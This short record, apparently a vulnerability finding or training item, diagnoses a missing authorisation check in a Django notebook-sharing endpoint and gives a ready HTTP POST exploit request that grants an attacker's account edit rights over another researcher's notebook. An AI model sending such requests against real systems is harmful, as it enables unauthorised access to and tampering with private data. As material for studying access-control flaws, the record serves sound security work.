diagnosis: The endpoint retrieves a ResearchNotebook by ID and grants edit permissions to target_user using guardian's assign_perm(). However, it never checks whether request.user has 'change_researchnotebook' or ownership permissions on the notebook, allowing any authenticated user to grant themselves or peers write permissions over any researcher's private notebook.
exploit_request:
POST /api/notebooks/742/share/ HTTP/1.1
Host: lab.example.org
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

target_username=attacker
